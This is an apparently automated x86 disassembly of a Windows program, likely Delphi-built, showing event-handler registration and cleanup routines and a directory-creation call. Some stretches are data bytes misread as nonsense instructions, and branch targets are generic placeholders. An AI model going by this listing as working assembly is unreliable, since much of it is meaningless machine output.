call [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x4 ]
mov ebx [ ebx + 0x4 ]
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
dec eax
test eax eax
jl r-xdata
mov eax [ esp ]
call sub_3a7d3a0
push 0x0
push 0x0
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
call sub_3a7ce38
push 0x0
push 0x0
mov eax [ esp + 0xc ]
call sub_3a7cbbc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esi ] dl
movzx edx [ edi ]
mov [ esi ] dl
jmp r-xdata
movzx edx [ ebx ]
cmp dl 0x30
jne r-xdata
inc edi
inc esi
inc ebx
dec eax
jne r-xdata
sub_3aebd12
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
outsb
dec ebp
outsd
popad
insb
inc ebp
outsb
dec edi
outsb
add eax [ eax - 0x7f010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000e ] al
add [ eax ] al
add esp [ eax - 0x5f010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c000c ] al
outsb
dec ebp
outsd
popad
insb
inc edx
imul ebp [ gs : bp - 0x4 ] 0xa803a775
add [ eax ] al
[ eax + 0x1ff0000 ]
outsb
outsd
jb r-xdata
cld
jne r-xdata
popad
cld
jne r-xdata
idiv edi
je r-xdata
dec edi
cld
cmp al 0xac
add edx [ eax - 0x6f010000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000f ] al
outsb
push ebx
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
push es
dec edi
outsb
dec eax
add edi [ eax ]
add bh bh
js r-xdata
mov bh dh
jmp [ edi + ecx * 4 + 0x5 ]
inc ebx
popad
jae r-xdata
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
add cl al
scasb [ edi ]
add ecx [ esp + edx * 2 ]
dec ebp
jne r-xdata
test al 0x3
in al dx
mov eax eax
adc [ esi + 0x3ae ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x6e616843
outsb
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
and eax 0x8803ac
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or cl [ edi + 0x6e ]
push ebx
push 0x4374726f
jne r-xdata
insb
jo r-xdata
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
cld
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or cl [ edi + 0x6e ]
pop esi
pop ebx
retn
jb r-xdata
js r-xdata
outsb
push ebx
je r-xdata
push esp
cmp eax 0x9803ac
add bh bh
cwde
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0011 ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx ] cl
dec edi
outsb
inc ebp
js r-xdata
add [ eax + 0x4f060009 ] al
add ebx [ eax ]
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x8b
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edi [ eax - 0x3e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x42 ] al
scasb [ edi ]
add eax [ eax ]
inc eax
add [ esi + edi * 4 - 0x52 ] dl
add eax [ edi ]
or al 0x54
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
push esp
mov esi 0x3ae
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov esi 0x4003ae
scasb [ edi ]
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xchg esp eax
cmp [ eax - 0x57c523fd ] ebp
add edx esp
cmp ebp [ eax - 0x57c1f7fd ]
add ebp esp
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
dec edi
jo r-xdata
cmp [ eax + 0x32 ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
pushad
add [ eax ] al
jmp [ eax ]
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
je r-xdata
cmp [ eax + 0x32 ] 0x0
inc ebx
popad
jae r-xdata
jb r-xdata
je r-xdata
mov esi 0x8c1803ae
cmpsd [ esi ] [ edi ]
add eax [ edx ]
add [ eax ] cl
inc ecx
jo r-xdata
pop ebx
retn
add [ eax ] al
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
inc ebp
jbe r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83664
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
fmul [ ebx + 0x53ff3c43 ]
cmp [ ebx - 0x3d ] bl
mov eax eax
mov eax esi
test bl bl
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3aec0dc
mov eax esi
pop [ fs : 0x0 ]
add esp 0xc
call sub_3a6473c
sub_3aebf14
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_3aebf44
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_3aebf64
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa1868
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3aebfce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_3ac0f38
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
mov ebx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aec050
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_3aec078
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_3aec0dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a84d10
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a84ca8
sub_3aec100
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ rw-data ]
xor edx edx
mov eax ebx
call sub_3a83664
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a84b10
mov [ ebx + 0x30 ] eax
mov eax [ esi ]
mov [ eax + 0xdc ] ebx
mov [ eax + 0xd8 ] sub_3aec3b4
mov eax [ esi ]
mov [ eax + 0xe4 ] ebx
mov [ eax + 0xe0 ] sub_3aec430
mov eax [ esi ]
mov [ eax + 0x13c ] ebx
mov [ eax + 0x138 ] sub_3aec4ac
mov eax [ esi ]
mov [ eax + 0x134 ] ebx
mov [ eax + 0x130 ] sub_3aec520
mov eax [ esi ]
mov [ eax + 0xec ] ebx
mov [ eax + 0xe8 ] sub_3aec594
mov eax [ esi ]
mov [ eax + 0x11c ] ebx
mov [ eax + 0x118 ] sub_3aec650
mov eax [ esi ]
mov [ eax + 0x124 ] ebx
mov [ eax + 0x120 ] sub_3aec6f0
mov eax [ esi ]
mov [ eax + 0x12c ] ebx
mov [ eax + 0x128 ] sub_3aec764
mov eax [ esi ]
mov [ eax + 0x104 ] ebx
mov [ eax + 0x100 ] sub_3aec7e0
mov eax [ esi ]
mov [ eax + 0x144 ] ebx
mov [ eax + 0x140 ] sub_3aec85c
mov eax [ esi ]
mov [ eax + 0x14c ] ebx
mov [ eax + 0x148 ] sub_3aec8d0
mov eax [ esi ]
mov [ eax + 0x15c ] ebx
mov [ eax + 0x158 ] sub_3aec9c0
mov eax [ esi ]
mov [ eax + 0x154 ] ebx
mov [ eax + 0x150 ] sub_3aec944
mov eax [ esi ]
mov [ eax + 0x164 ] ebx
mov [ eax + 0x160 ] sub_3aeca40
mov eax [ esi ]
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] sub_3aecb30
mov eax [ esi ]
mov [ eax + 0x114 ] ebx
mov [ eax + 0x110 ] sub_3aecba4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aec278
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd8 ] ecx
mov [ edx + 0xdc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe0 ] ecx
mov [ edx + 0xe4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x138 ] ecx
mov [ edx + 0x13c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x130 ] ecx
mov [ edx + 0x134 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe8 ] ecx
mov [ edx + 0xec ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x118 ] ecx
mov [ edx + 0x11c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x120 ] ecx
mov [ edx + 0x124 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x128 ] ecx
mov [ edx + 0x12c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x100 ] ecx
mov [ edx + 0x104 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x140 ] ecx
mov [ edx + 0x144 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x148 ] ecx
mov [ edx + 0x14c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x158 ] ecx
mov [ edx + 0x15c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x150 ] ecx
mov [ edx + 0x154 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x160 ] ecx
mov [ edx + 0x164 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x108 ] ecx
mov [ edx + 0x10c ] ecx
mov eax [ eax ]
xor edx edx
mov [ eax + 0x110 ] edx
mov [ eax + 0x114 ] edx
mov eax [ esi + 0x30 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aec3b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec420
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec427
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aebec4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec430
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec49c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec4a3
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aebed8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec4ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec513
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec51a
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aebeec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec520
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec587
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec58e
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aebf00
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec594
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_3aec643
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec64a
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_3aebf14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_3acf898
sub_3aec650
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec6d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec6e0
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aebf44
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
sub_3aec6f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec757
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec75e
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aebf64
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec764
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec7d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec7d7
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aebfdc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec7e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec84c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec853
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aebff0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec85c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec8c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec8ca
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aec004
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec8d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec937
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec93e
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aec018
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec944
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aec9b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aec9b7
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aec034
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aec9c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aeca30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aeca37
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aec050
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aeca40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aecab4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aecabb
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov ecx edi
mov edx esi
call sub_3aec078
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aecac4
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
jle r-xdata
pop ebx
retn
dec [ ebx + 0x3c ]
mov [ ebx + 0x38 ] 0x0
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_3a84d10
mov edx [ ebx + 0x30 ]
mov edx [ edx + 0x8 ]
dec edx
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_3a84d80
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_3a84ca8
xor eax eax
mov [ ebx + 0x34 ] eax
sub_3aecb30
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aecb97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aecb9e
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aec0a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aecba4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3aec0fc
xor eax eax
push ebp
push sub_3aecc0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aecb28
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aecc12
mov eax [ ebp - 0x4 ]
call sub_3aecac4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aecb14
mov edx esi
call sub_3aec0c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3aecc18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3aecc3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aecc44
retn
sub_3aecc50
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3aeccd0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_3a6a114
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax ebx
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_3a655b8
mov eax [ ebx ]
call sub_3a69df0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aeccd7
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push 0x0
mov eax [ ebx ]
call sub_3a65730
push eax
call CreateDirectoryA
sub_3aeccf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3aecd9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_3a6a114
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0x8 ]
push r-xdata
